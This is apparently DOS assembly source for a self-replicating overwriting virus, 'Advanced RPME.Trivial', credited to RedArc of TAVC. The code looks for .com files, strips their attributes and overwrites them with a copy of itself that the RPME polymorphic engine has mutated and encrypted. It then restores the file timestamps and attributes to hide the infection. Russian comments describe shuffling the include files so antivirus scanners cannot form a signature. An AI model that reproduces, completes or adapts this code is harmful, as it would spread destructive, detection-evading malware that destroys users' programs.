;Advanced RPME.Trivial (c) by RedArc // TAVC

Model Tiny
.code
.286
jumps
org 100h
start:

     ;
     ;mov sp,0fffch  - Вы не забыли восстановить состояние стека?
     ;                 а я забыл ;)

     jmp VirBeg
include rnd.inc       ;а вот эти три инклуда лучше ставить на случайное
include rpme02.inc    ;место в каждом звере, дабы код ангины не послужил
include ende.inc      ;маской для поиска вируса в том же стеке...
VirBeg:
     mov ah,4eh
     mov cx,0ffh
     mov dx,MASK_offs+100h
Interrupt:
     int 21h
     jb NotFound
     jmp Infect
NotFound:
     int 20h
Infect:
     mov si,100h
     mov di,100h+Buff
     mov cx,MyLength
     call RPME
     mov word ptr cs:[BuffLength+100h],cx
     mov dx,9eh
     mov ax,4301h
     xor cx,cx
     int 21h
     mov dx,9eh
     mov ax,3d02h
     int 21h
     xchg ax,bx
     call WRITE_BUF
     mov di,100h+Buff
     call RPME_ENDE
     mov word ptr cs:[BuffLength+100h],cx
     call WRITE_BUF
     mov ax,5701h
     mov cx,word ptr cs:[96h]
     mov dx,word ptr cs:[98h]
     int 21h
     mov ah,3eh
     int 21h
     mov ax,4301h
     mov cx,word ptr cs:[95h]
     int 21h
     mov ah,4fh
     jmp Interrupt

WRITE_BUF:
     mov ah,40h
     mov dx,Buff+100h
     mov cx,word ptr cs:[BuffLength+100h]
     int 21h
     ret

MASK_offs equ $-start
db '*.com',0h
db 1,2,3,4,5,6,7,8,9
MyLength equ $-start
BuffLength equ $-start
     dw ?
Buff equ $-start
end start
